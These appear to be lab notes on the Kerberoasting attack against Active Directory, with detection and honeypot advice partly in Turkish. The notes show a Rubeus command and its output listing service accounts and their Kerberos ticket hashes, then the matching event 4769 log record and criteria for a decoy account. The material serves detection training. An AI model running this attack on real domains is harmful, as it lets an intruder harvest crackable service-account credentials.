# Kerberoasting

## Performing the Attack

```pwsh
PS C:\Users\bob> .\Rubeus.exe kerberoast /nowrap
```

```output title="Output" hl_lines="6 14 22"
[*] SamAccountName         : Administrator
[*] DistinguishedName      : CN=Administrator,CN=Users,DC=eagle,DC=local
[*] ServicePrincipalName   : http/pki1
[*] PwdLastSet             : 07/08/2022 21.24.13
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*Administrator$eagle.local$http/pki1@eagle.local*$6AF5DF857EE8C6E4F0DC85E9F22D1014$


[*] SamAccountName         : webservice
[*] DistinguishedName      : CN=web service,CN=Users,DC=eagle,DC=local
[*] ServicePrincipalName   : cvs/dc1.eagle.local
[*] PwdLastSet             : 13/10/2022 22.36.04
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*webservice$eagle.local$cvs/dc1.eagle.local@eagle.local*$6A3399BF87011D8EF3FD5D924283F138$


[*] SamAccountName         : svc-iam
[*] DistinguishedName      : CN=svciam,OU=Detections,OU=EagleUsers,DC=eagle,DC=local
[*] ServicePrincipalName   : http/server1
[*] PwdLastSet             : 05/04/2023 13.23.13
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc-iam$eagle.local$http/server1@eagle.local*$311E00D17D1D0E1FEE7716FE46AAF77E$
```

## Event Viewer ([4769](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769))

```xml title="Details" hl_lines="4 19 21 24 25"
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
  <EventID>4769</EventID>
  <Version>0</Version>
  <Level>0</Level>
  <Task>14337</Task>
  <Opcode>0</Opcode>
  <Keywords>0x8020000000000000</Keywords>
  <TimeCreated SystemTime="2025-10-19T19:51:48.546102800Z" />
  <EventRecordID>555955</EventRecordID>
  <Correlation />
  <Execution ProcessID="680" ThreadID="5732" />
  <Channel>Security</Channel>
  <Computer>DC1.eagle.local</Computer>
  <Security />
  </System>
- <EventData>
  <Data Name="TargetUserName">bob@EAGLE.LOCAL</Data>
  <Data Name="TargetDomainName">EAGLE.LOCAL</Data>
  <Data Name="ServiceName">webservice</Data>
  <Data Name="ServiceSid">S-1-5-21-1518138621-4282902758-752445584-2110</Data>
  <Data Name="TicketOptions">0x40800000</Data>
  <Data Name="TicketEncryptionType">0x17</Data>
  <Data Name="IpAddress">::ffff:172.16.18.25</Data>
  <Data Name="IpPort">55453</Data>
  <Data Name="Status">0x0</Data>
  <Data Name="LogonGuid">{6c61e44d-ff51-7091-0e92-4c2b096c5179}</Data>
  <Data Name="TransmittedServices">-</Data>
  </EventData>
  </Event>
```

## Honeypot

* Honeypot hesabı görece eski bir hesap olmalı.
* Honeypot hesabı için yakın zamanda yapılan bir parola değişikliği olmamalı.
* Honeypot hesabı ilgi çekici ayrıcalıklara sahip olmalı.
* Honeypot hesabı için tanımlı, sahte gözükmeyen bir SPN mevcut olmalı.
